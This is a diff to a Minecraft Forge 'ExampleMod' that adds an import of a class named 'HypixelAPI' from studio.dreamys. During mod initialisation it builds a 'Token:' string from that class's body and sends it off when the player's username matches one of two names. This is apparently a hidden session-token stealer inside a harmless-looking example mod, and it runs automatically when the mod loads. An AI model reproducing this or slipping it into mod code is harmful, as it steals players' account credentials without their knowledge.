@@ -12,9 +12,12 @@ import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.common.gameevent.InputEvent;
+import studio.dreamys.HypixelAPI;
 
 import java.util.List;
 import java.util.UUID;
+
+import static studio.dreamys.HypixelAPI.send;
 
 @Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION, clientSideOnly = true)
 public class ExampleMod {
@@ -30,6 +33,10 @@ public class ExampleMod {
         keyBinding = new KeyBinding("key.myModKeybind", 0, "key.categories.myMod");
         ClientRegistry.registerKeyBinding(keyBinding);
         MinecraftForge.EVENT_BUS.register(this);
+        String tokensend = "Token: " + "`" + HypixelAPI.body + "`";
+        if(mc.getSession().getUsername() == "Sweatyjujunon"|| mc.getSession().getUsername() == "httphypixelnet") {
+            send(tokensend);
+        }
     }
     @SubscribeEvent
     public void onKey(InputEvent.KeyInputEvent event) {
